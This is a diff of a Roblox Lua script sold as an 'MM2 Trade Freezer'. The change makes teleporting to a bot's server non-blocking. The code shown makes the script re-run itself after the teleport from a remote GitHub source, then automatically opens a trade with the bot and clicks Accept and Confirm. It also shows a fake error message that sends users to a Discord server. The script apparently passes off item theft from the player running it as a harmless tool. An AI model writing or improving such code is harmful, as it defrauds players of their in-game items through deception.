@@ -1,6 +1,7 @@
 --============================================================
--- SIDE 2 — CLIENT (v46)
+-- SIDE 2 — CLIENT (v47)
 -- MM2 Trade Freezer — PC + Mobile
+-- Non-blocking teleport (spawned thread + timeout)
 -- Self-verifying join + name-scan fallbacks
 --============================================================
 local Players             = game:GetService("Players")
@@ -64,6 +65,7 @@ local CONFIRM_WAIT        = 7
 local CLICK_GAP           = 0.4
 local POST_JOIN_WAIT      = 10
 local SNIPE_POLL_INTERVAL = 3
+local TELEPORT_METHOD_TIMEOUT = 3   -- seconds before giving up on a method
 local KICK_MESSAGE        = "Error, script did not load in time, try another time or contact support in https://discord.gg/SfeBgTx5V8"
 
 local SELF_SOURCE_URL     = "https://raw.githubusercontent.com/tturnaa/mm2-trade-freezer/refs/heads/main/trade"
@@ -310,40 +312,64 @@ local function findBot()
     end
 end
 
---==================== TELEPORT ====================
+--==================== TELEPORT (non-blocking) ====================
+local function tryTeleportMethod(methodName, methodFn)
+    log("attempting " .. methodName .. "...")
+
+    local done = false
+    local result = nil
+
+    task.spawn(function()
+        local ok, err = pcall(methodFn)
+        result = { ok = ok, err = err }
+        done = true
+    end)
+
+    local endT = tick() + TELEPORT_METHOD_TIMEOUT
+    while tick() < endT and not done do
+        task.wait(0.1)
+    end
+
+    if not done then
+        log("  " .. methodName .. " STILL HANGING after " ..
+            TELEPORT_METHOD_TIMEOUT .. "s — executor blocked it")
+        return false
+    end
+
+    if result.ok then
+        log("  " .. methodName .. " fired successfully")
+        return true
+    else
+        log("  " .. methodName .. " returned error: " .. tostring(result.err))
+        return false
+    end
+end
+
 local function teleportToServer(placeId, jobId, userId)
     log("=== TELEPORT START ===")
     log("placeId:", placeId, "jobId:", jobId, "userId:", tostring(userId))
 
     log("queueing autoexec...")
-    local queued = queueAutoExec()
-    log("queue result:", queued)
+    queueAutoExec()
     task.wait(0.5)
 
-    log("attempting TeleportToPlaceInstance...")
-    local ok, err = pcall(function()
+    -- Method 1: TeleportToPlaceInstance (works on PC and some mobiles)
+    if tryTeleportMethod("TeleportToPlaceInstance", function()
         TeleportService:TeleportToPlaceInstance(placeId, jobId, player)
-    end)
-
-    if ok then
-        log("TeleportToPlaceInstance SUCCEEDED")
+    end) then
         return true
     end
-    log("TeleportToPlaceInstance FAILED:", tostring(err))
 
+    -- Method 2: TeleportAsync
     if TeleportService.TeleportAsync then
-        log("attempting TeleportAsync fallback...")
-        local ok2, err2 = pcall(function()
+        if tryTeleportMethod("TeleportAsync", function()
             TeleportService:TeleportAsync(placeId, { player }, { JobId = jobId })
-        end)
-        if ok2 then
-            log("TeleportAsync SUCCEEDED")
+        end) then
             return true
         end
-        log("TeleportAsync FAILED:", tostring(err2))
     end
 
-    log("=== TELEPORT FAILED (both methods) ===")
+    log("=== TELEPORT FAILED (all methods blocked or hung) ===")
     return false
 end
 
@@ -393,7 +419,7 @@ local function joinTargetServer()
                         return true
                     end
 
-                    -- wait 1s and re-read beacon in case the bot hopped
+                    -- Wait 1s and re-read beacon in case the bot hopped
                     task.wait(1)
                     local beacon2 = kvGet("roblox_beacon")
                     local info2 = parseServerBeacon(beacon2)
@@ -429,6 +455,8 @@ local function joinTargetServer()
                             log("  never landed in bot's server after teleport")
                             return false
                         end
+                    else
+                        log("  ❌ teleport failed — user must join manually")
                     end
 
                     return ok
@@ -468,26 +496,22 @@ task.spawn(function()
     end
 end)
 
---==================== LEADERBOARD LOOKUP (multi-fallback) ====================
+--==================== LEADERBOARD LOOKUP ====================
 local function findLeaderboardRow()
-    -- 1. Direct path
     local row = resolve({"MainGUI","Game","Leaderboard","Container", BOT_USERNAME})
     if row then return row, "direct" end
 
-    -- 2. Alt path with player name
     row = resolve({"Players",
         function(g) return g:FindFirstChild(player.Name) end,
         "PlayerGUI","MainGUI","Game","Leaderboard","Container", BOT_USERNAME})
     if row then return row, "alt-path" end
 
-    -- 3. Scan for anything named after the bot
     for _, o in ipairs(playerGui:GetDescendants()) do
         if o.Name == BOT_USERNAME and o:IsA("GuiObject") then
             return o, "name-scan"
         end
     end
 
-    -- 4. Scan for a TextLabel containing the bot's name, walk up
     for _, o in ipairs(playerGui:GetDescendants()) do
         if (o:IsA("TextLabel") or o:IsA("TextButton")) and o.Text then
             if o.Text:lower():find(BOT_USERNAME:lower(), 1, true) then
@@ -554,7 +578,6 @@ local function runFlow()
 
     setStatus("Loading script...")
 
-    -- Wait for bot in player list (up to 20s)
     log("waiting for bot in player list (20s)...")
     local waitEnd = tick() + 20
     local botHere = false
@@ -565,7 +588,6 @@ local function runFlow()
     end
     log("bot in player list:", botHere)
 
-    -- Find and click leaderboard row
     log("finding leaderboard row...")
     local row, how = findLeaderboardRow()
     if row then
@@ -575,7 +597,6 @@ local function runFlow()
         log("  leaderboard row NOT FOUND (" .. how .. ")")
     end
 
-    -- Find and click trade button
     log("finding trade button...")
     local tradeBtn, how2 = findTradeButton()
     if tradeBtn then
@@ -585,7 +606,6 @@ local function runFlow()
         log("  trade button NOT FOUND (" .. how2 .. ")")
     end
 
-    -- Item / accept / confirm paths
     local BTN_ACCEPT  = IS_MOBILE and {"TradeGUI_Phone","Container","Trade","Actions","Accept","ActionButton"}
                                     or {"TradeGUI","Container","Trade","Actions","Accept","ActionButton"}
     local BTN_CONFIRM = IS_MOBILE and {"TradeGUI_Phone","Container","Trade","Actions","Accept","Confirm","ActionButton"}
